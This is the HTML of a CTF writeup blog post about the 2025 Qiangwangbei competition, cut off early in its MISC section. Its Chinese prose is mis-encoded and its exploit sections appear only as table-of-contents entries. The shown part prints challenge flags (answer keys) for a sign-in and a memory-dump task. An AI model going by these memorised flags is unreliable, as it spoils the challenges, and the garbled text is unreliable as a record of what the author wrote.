<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="2025.10.18~19å¼ºç½‘æ¯-writeup">
<title>2025å¼ºç½‘æ¯</title>

<link rel='canonical' href='https://expl0rer.top/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/'>

<link rel="stylesheet" href="/scss/style.min.84f4364fa3a5758ecded3430d054d555b355a8e9efd1baf1e03c18d73802579f.css"><meta property='og:title' content="2025å¼ºç½‘æ¯">
<meta property='og:description' content="2025.10.18~19å¼ºç½‘æ¯-writeup">
<meta property='og:url' content='https://expl0rer.top/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/'>
<meta property='og:site_name' content='Expl0rer.Ct'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-10-20T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-07T13:13:31&#43;00:00'/><meta property='og:image' content='https://expl0rer.top/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/QWB-logo.png' />
<meta name="twitter:title" content="2025å¼ºç½‘æ¯">
<meta name="twitter:description" content="2025.10.18~19å¼ºç½‘æ¯-writeup"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://expl0rer.top/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/QWB-logo.png' />
    <link rel="shortcut icon" href="/favicon.ico" />
<div class="loading">
     
    <div id="ghost">
        <div id="red">
            <div id="pupil"></div>
            <div id="pupil1"></div>
            <div id="eye"></div>
            <div id="eye1"></div>
            <div id="top0"></div>
            <div id="top1"></div>
            <div id="top2"></div>
            <div id="top3"></div>
            <div id="top4"></div>
            <div id="st0"></div>
            <div id="st1"></div>
            <div id="st2"></div>
            <div id="st3"></div>
            <div id="st4"></div>
            <div id="st5"></div>
            <div id="an1"></div>
            <div id="an2"></div>
            <div id="an3"></div>
            <div id="an4"></div>
            <div id="an5"></div>
            <div id="an6"></div>
            <div id="an7"></div>
            <div id="an8"></div>
            <div id="an9"></div>
            <div id="an10"></div>
            <div id="an11"></div>
            <div id="an12"></div>
            <div id="an13"></div>
            <div id="an14"></div>
            <div id="an15"></div>
            <div id="an16"></div>
            <div id="an17"></div>
            <div id="an18"></div>
        </div>
        <div id="shadow"></div>
    </div>
</div>

<style>
    .loading {
        position: fixed;
        display: flex;
        justify-content: center;
        align-items: center;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 99;
        background-color: #f5f5fa;
        transition: opacity 0.5s ease;
    }
	
      
#ghost {
  position: relative;
  scale: 0.8;
}

#red {
  animation: upNDown infinite 1s;
  position: relative;
  width: 140px;
  height: 140px;
  display: grid;
  grid-template-columns: repeat(14, 1fr);
  grid-template-rows: repeat(14, 1fr);
  grid-column-gap: 0px;
  grid-row-gap: 0px;
  grid-template-areas:
    "a1  a2  a3  a4  a5  top0  top0  top0  top0  a10 a11 a12 a13 a14"
    "b1  b2  b3  top1 top1 top1 top1 top1 top1 top1 top1 b12 b13 b14"
    "c1 c2 top2 top2 top2 top2 top2 top2 top2 top2 top2 top2 c13 c14"
    "d1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 d14"
    "e1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 e14"
    "f1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 f14"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "st0 st0 an4 st1 an7 st2 an10 an10 st3 an13 st4 an16 st5 st5"
    "an1 an2 an3 an5 an6 an8 an9 an9 an11 an12 an14 an15 an17 an18";
}

@keyframes upNDown {
  0%,
  49% {
    transform: translateY(0px);
  }
  50%,
  100% {
    transform: translateY(-10px);
  }
}

#top0,
#top1,
#top2,
#top3,
#top4,
#st0,
#st1,
#st2,
#st3,
#st4,
#st5 {
  background-color: red;
}

#top0 {
  grid-area: top0;
}

#top1 {
  grid-area: top1;
}

#top2 {
  grid-area: top2;
}

#top3 {
  grid-area: top3;
}

#top4 {
  grid-area: top4;
}

#st0 {
  grid-area: st0;
}

#st1 {
  grid-area: st1;
}

#st2 {
  grid-area: st2;
}

#st3 {
  grid-area: st3;
}

#st4 {
  grid-area: st4;
}

#st5 {
  grid-area: st5;
}

#an1 {
  grid-area: an1;
  animation: flicker0 infinite 1s;
}

#an18 {
  grid-area: an18;
  animation: flicker0 infinite 1s;
}

#an2 {
  grid-area: an2;
  animation: flicker1 infinite 1s;
}

#an17 {
  grid-area: an17;
  animation: flicker1 infinite 1s;
}

#an3 {
  grid-area: an3;
  animation: flicker1 infinite 1s;
}

#an16 {
  grid-area: an16;
  animation: flicker1 infinite 1s;
}

#an4 {
  grid-area: an4;
  animation: flicker1 infinite 1s;
}

#an15 {
  grid-area: an15;
  animation: flicker1 infinite 1s;
}

#an6 {
  grid-area: an6;
  animation: flicker0 infinite 1s;
}

#an12 {
  grid-area: an12;
  animation: flicker0 infinite 1s;
}

#an7 {
  grid-area: an7;
  animation: flicker0 infinite 1s;
}

#an13 {
  grid-area: an13;
  animation: flicker0 infinite 1s;
}

#an9 {
  grid-area: an9;
  animation: flicker1 infinite 1s;
}

#an10 {
  grid-area: an10;
  animation: flicker1 infinite 1s;
}

#an8 {
  grid-area: an8;
  animation: flicker0 infinite 1s;
}

#an11 {
  grid-area: an11;
  animation: flicker0 infinite 1s;
}

@keyframes flicker0 {
  0%,
  49% {
    background-color: red;
  }
  50%,
  100% {
    background-color: transparent;
  }
}

@keyframes flicker1 {
  0%,
  49% {
    background-color: transparent;
  }
  50%,
  100% {
    background-color: red;
  }
}

#eye {
  width: 40px;
  height: 50px;
  position: absolute;
  top: 30px;
  left: 10px;
}

#eye::before {
  content: "";
  background-color: white;
  width: 20px;
  height: 50px;
  transform: translateX(10px);
  display: block;
  position: absolute;
}

#eye::after {
  content: "";
  background-color: white;
  width: 40px;
  height: 30px;
  transform: translateY(10px);
  display: block;
  position: absolute;
}

#eye1 {
  width: 40px;
  height: 50px;
  position: absolute;
  top: 30px;
  right: 30px;
}

#eye1::before {
  content: "";
  background-color: white;
  width: 20px;
  height: 50px;
  transform: translateX(10px);
  display: block;
  position: absolute;
}

#eye1::after {
  content: "";
  background-color: white;
  width: 40px;
  height: 30px;
  transform: translateY(10px);
  display: block;
  position: absolute;
}

#pupil {
  width: 20px;
  height: 20px;
  background-color: blue;
  position: absolute;
  top: 50px;
  left: 10px;
  z-index: 1;
  animation: eyesMovement infinite 6s;
}

#pupil1 {
  width: 20px;
  height: 20px;
  background-color: blue;
  position: absolute;
  top: 50px;
  right: 50px;
  z-index: 1;
  animation: eyesMovement infinite 6s;
}

@keyframes eyesMovement {
  0%,
  49% {
    transform: translateX(0px);
  }
  50%,
  99% {
    transform: translateX(10px);
  }
  100% {
    transform: translateX(0px);
  }
}

#shadow {
  background-color: black;
  width: 140px;
  height: 140px;
  position: absolute;
  border-radius: 50%;
  transform: rotateX(80deg);
  filter: blur(20px);
  top: 80%;
  animation: shadowMovement infinite 1s;
}

@keyframes shadowMovement {
  0%,
  49% {
    opacity: 0.5;
  }
  50%,
  100% {
    opacity: 0.2;
  }
}

</style>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>

<script>	
    function initLoading() {
        let loading = document.querySelector(".loading");
        document.addEventListener('DOMContentLoaded', function() {
            
            setTimeout(() => {
                loading.style.opacity = "0";
                
                setTimeout(() => {
                    loading.style.display = "none";
                }, 500);
            }, 500); 
        });
    }

    initLoading();
</script>


<link
  rel="stylesheet"
  href="https://cdn-font.hyperos.mi.com/font/css?family=MiSans:400:Chinese_Simplify,Latin&display=swap"
/>



<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreen.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreenr.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreen.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreenr.css" />


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_1a3c99934e119e1b.png" width="300"
                            height="268" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ«¡</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Expl0rer.Ct</a></h1>
            <h2 class="site-description">å¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://space.bilibili.com/695179979?spm_id_from=333.40138.0.0'
                        target="_blank"
                        title="Bilibili"
                        rel="me"
                    >
                        
                        
                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/Expl0rer-Ct'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ | Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E-about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº | About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£ | Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢ | Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5-links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>æŠ€æœ¯é“¾æ¥ | Links</span>
            </a>
        </li>
        
        
        <li >
            <a href='/friends-links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>å‹æƒ…é“¾æ¥ | Friends Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <!--
tags: [temperature, hot, wheater, thermometer, forecast]
category: Weather
version: "1.73"
unicode: "f236"
-->
<svg
  xmlns="http://www.w3.org/2000/svg"
  width="32"
  height="32"
  viewBox="0 0 24 24"
  fill="none"
  stroke="#ff9500"
  stroke-width="1"
  stroke-linecap="round"
  stroke-linejoin="round"
  class="icon-tabler-sun-high"
>
  <path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" />
  <path d="M6.343 17.657l-1.414 1.414" />
  <path d="M6.343 6.343l-1.414 -1.414" />
  <path d="M17.657 6.343l1.414 -1.414" />
  <path d="M17.657 17.657l1.414 1.414" />
  <path d="M4 12h-2" />
  <path d="M12 4v-2" />
  <path d="M20 12h2" />
  <path d="M12 20v2" />
</svg>

                        <!--
tags: [night, dark mode]
category: Weather
version: "1.21"
unicode: "ece7"
-->
<svg
  xmlns="http://www.w3.org/2000/svg"
  width="32"
  height="32"
  viewBox="0 0 24 24"
  fill="none"
  stroke="#8d6e63"
  stroke-width="1"
  stroke-linecap="round"
  stroke-linejoin="round"
  class="icon-tabler-moon-stars"
>
  <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
  <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2" />
  <path d="M19 11h2m-1 -1v2" />
</svg>

                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#å‰è¨€">å‰è¨€</a></li>
    <li><a href="#misc">MISC</a>
      <ol>
        <li><a href="#ç­¾åˆ°">ç­¾åˆ°</a>
          <ol>
            <li><a href="#è§£é¢˜æ€è·¯">è§£é¢˜æ€è·¯</a></li>
            <li><a href="#flag">flag</a></li>
          </ol>
        </li>
        <li><a href="#personal-vault">Personal Vault</a>
          <ol>
            <li><a href="#è§£é¢˜æ€è·¯-1">è§£é¢˜æ€è·¯</a></li>
            <li><a href="#flag-1">flag</a></li>
          </ol>
        </li>
        <li><a href="#é—®å·è°ƒæŸ¥">é—®å·è°ƒæŸ¥</a>
          <ol>
            <li><a href="#flag-2">flag</a></li>
          </ol>
        </li>
        <li><a href="#legacyoled">legacyOLED</a>
          <ol>
            <li><a href="#è§£é¢˜æ€è·¯-2">è§£é¢˜æ€è·¯</a></li>
            <li><a href="#flag-3">flag</a></li>
          </ol>
        </li>
        <li><a href="#è°å½±é‡é‡60">è°å½±é‡é‡6.0</a></li>
        <li><a href="#the_interrogation_room">The_Interrogation_Room</a>
          <ol>
            <li><a href="#è§£é¢˜æ€è·¯-3">è§£é¢˜æ€è·¯</a></li>
            <li><a href="#flag-4">flag</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#crypto">Crypto</a>
      <ol>
        <li><a href="#check-little">check-little</a></li>
      </ol>
    </li>
    <li><a href="#web">Web</a>
      <ol>
        <li><a href="#secretvault">SecretVault</a>
          <ol>
            <li><a href="#è§£é¢˜æ€è·¯-4">è§£é¢˜æ€è·¯</a></li>
            <li><a href="#flag-5">flag</a></li>
          </ol>
        </li>
        <li><a href="#bbtv">bbtv</a>
          <ol>
            <li><a href="#è§£é¢˜æ€è·¯-5">è§£é¢˜æ€è·¯</a></li>
            <li><a href="#flag-6">flag</a></li>
          </ol>
        </li>
        <li><a href="#yamcs">yamcs</a>
          <ol>
            <li><a href="#è§£é¢˜æ€è·¯-6">è§£é¢˜æ€è·¯</a></li>
            <li><a href="#flag-7">flag</a></li>
          </ol>
        </li>
        <li><a href="#anime">anime</a>
          <ol>
            <li><a href="#è§£é¢˜æ€è·¯-7">è§£é¢˜æ€è·¯</a></li>
            <li><a href="#flag-8">flag</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#reverse">Reverse</a>
      <ol>
        <li><a href="#butterfly">butterfly</a>
          <ol>
            <li><a href="#è§£é¢˜æ€è·¯-8">è§£é¢˜æ€è·¯</a></li>
            <li><a href="#flag-9">flag</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#pwn">PWN</a>
      <ol>
        <li><a href="#flag-market">flag-market</a>
          <ol>
            <li><a href="#è§£é¢˜æ€è·¯-9">è§£é¢˜æ€è·¯</a></li>
            <li><a href="#expflag">expã€flag</a></li>
          </ol>
        </li>
        <li><a href="#bph">bph</a>
          <ol>
            <li><a href="#è§£é¢˜æ€è·¯-10">è§£é¢˜æ€è·¯</a></li>
            <li><a href="#expflag-1">expã€flag</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#ç»“å°¾">ç»“å°¾</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/">
                <img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/QWB-logo_hu_29d527b4b07bae7e.png"
                        srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/QWB-logo_hu_29d527b4b07bae7e.png 800w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/QWB-logo_hu_e104bc49ee221570.png 1600w"
                        width="800" 
                        height="389" 
                        loading="lazy"
                        alt="Featured image of post 2025å¼ºç½‘æ¯" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf_writeup/" style="background-color: #2a9d8f; color: #fff;">
                CTF_writeup
            </a>
        
            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%AF%94%E8%B5%9B/" style="background-color: #2a9d8f; color: #fff;">
                ç½‘ç»œå®‰å…¨æ¯”èµ›
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/">2025å¼ºç½‘æ¯</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            2025.10.18~19å¼ºç½‘æ¯-writeup
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-10-20</time>
            </div>
        

        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <p>[TOC]</p>
<p>2025å¹´çš„å¼ºç½‘æ¯ç»“æŸäº†ï¼Œè¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡å‚åŠ è¿™ä¹ˆé‡å¤§çš„çº¿ä¸Šèµ›ï¼Œè¿˜æ˜¯æ¯”è¾ƒç´§å¼ çš„ï¼Œé˜Ÿé‡Œçš„å¸ˆå‚…ä»¬éƒ½å¾ˆå¼ºåŠ²å•Šï¼Œä¸€èµ·é€šå®µå¹²cryptoã€miscã€reã€pwnã€webï¼ï¼</p>
<h2 id="å‰è¨€">å‰è¨€
</h2><p>2025å¹´çš„å¼ºç½‘æ¯ç»“æŸäº†ï¼Œè¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡å‚åŠ è¿™ä¹ˆé‡å¤§çš„çº¿ä¸Šèµ›ï¼Œè¿˜æ˜¯æ¯”è¾ƒç´§å¼ çš„ï¼Œæˆ‘ä¸ªäººä¸“PWNï¼Œä½†å¼ºç½‘æ¯æ¯”è¾ƒéš¾å•Šï¼Œæ‰å‡ºäº†1é“PWNï¼Œè¿˜æœ‰ä¸€é“æ˜¯æˆ‘çš„é˜Ÿå‹pwn-s.ï¼Œé˜Ÿé‡Œçš„å¸ˆå‚…ä»¬éƒ½å¾ˆå¼ºåŠ²å•Šï¼Œä¸€èµ·é€šå®µå¹²cryptoã€miscã€reã€pwnã€webï¼ï¼</p>
<p>æœ¬ä»¥ä¸ºèƒ½å†²çº¿ä¸‹çš„ï¼Œæ— å¥ˆå®åŠ›ä¸å¤Ÿï¼Œæ­¢æ­¥äºå…¨å›½116åï¼Œæ‹¿äº†793åˆ†ï¼ˆå¹²æ‰14é¢˜ï¼Œ6é¢˜MISCã€1é¢˜Reverseã€2é¢˜PWNã€4é¢˜Webã€1é¢˜Cryptoï¼‰ã€‚</p>
<blockquote class="alert alert-note">
    <blockquote>
<p>æ„Ÿè°¢å“¥å¸ƒæ—é¦–é¢†ã€Crypto0ã€cxã€LilRanã€yearnã€ZianTTã€å¤šå¤šã€æ¸…é…’ã€ç§‹é›¨æ ·å¸¦é£ï¼</p>
</blockquote></blockquote>
<p>ä»¥ä¸‹æ˜¯æˆ‘ä»¬å°é˜Ÿçš„å¤ç°ï¼Œæ¬¢è¿äº¤æµï¼ğŸ˜„</p>
<p>é˜Ÿä¼åç§°ï¼šGoblinSEC</p>
<p>é˜Ÿä¼æ’åï¼š116</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/QWB.png"
	width="1845"
	height="1071"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/QWB_hu_e9c46508776f4fb5.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/QWB_hu_70b8f2f7993ef77c.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="172"
		data-flex-basis="413px"
	
></p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/GoblinSEC%E6%88%98%E9%98%9F%E6%88%90%E5%91%98.png"
	width="1024"
	height="554"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/GoblinSEC%E6%88%98%E9%98%9F%E6%88%90%E5%91%98_hu_e79721c24b083159.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/GoblinSEC%E6%88%98%E9%98%9F%E6%88%90%E5%91%98_hu_ef1a3bcdfc6f4571.png 1024w"
	loading="lazy"
	
		alt="GoblinSECæˆ˜é˜Ÿ"
	
	
		class="gallery-image" 
		data-flex-grow="184"
		data-flex-basis="443px"
	
></p>
<h2 id="misc">MISC
</h2><h3 id="ç­¾åˆ°">ç­¾åˆ°
</h3><h4 id="è§£é¢˜æ€è·¯">è§£é¢˜æ€è·¯
</h4><p>é¢˜ç›®æè¿°æœ‰flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat flag 
</span></span><span class="line"><span class="cl">flag{æˆ‘å·²é˜…è¯»å‚èµ›é¡»çŸ¥ï¼Œå¹¶éµå®ˆæ¯”èµ›è§„åˆ™ã€‚}
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag">flag
</h4><p>flag{æˆ‘å·²é˜…è¯»å‚èµ›é¡»çŸ¥ï¼Œå¹¶éµå®ˆæ¯”èµ›è§„åˆ™ã€‚}</p>
<h3 id="personal-vault">Personal Vault
</h3><h4 id="è§£é¢˜æ€è·¯-1">è§£é¢˜æ€è·¯
</h4><p>è‰æ‹Ÿé©¬ï¼Œ010æ€ä¹ˆéé¢„æœŸï¼ï¼ï¼ğŸ¤¬</p>
<p>ç»™äº†ä¸ªDMPæ–‡ä»¶ï¼Œæˆ‘è¿˜ä»¥ä¸ºå–è¯å‘¢ã€‚</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/1.png"
	width="690"
	height="885"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/1_hu_d534853d34c0a3cf.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/1_hu_1ae0dc9a927e1284.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="77"
		data-flex-basis="187px"
	
></p>
<p>è¿™é“é¢˜ç”¨ä»˜è´¹ç‰ˆlovelymemæœç´¢flagä¹Ÿå¯ä»¥æ‰¾åˆ°ã€‚</p>
<h4 id="flag-1">flag
</h4><p>flag{personal_vault_seems_a_little_volatile_innit}</p>
<h3 id="é—®å·è°ƒæŸ¥">é—®å·è°ƒæŸ¥
</h3><p>å¡«é—®å·å¾—flagå’¯ï¼Œçœ‹åˆ°è¿™é‡Œä½ ç›´æ¥è·³å§ã€‚</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/2.png"
	width="690"
	height="320"
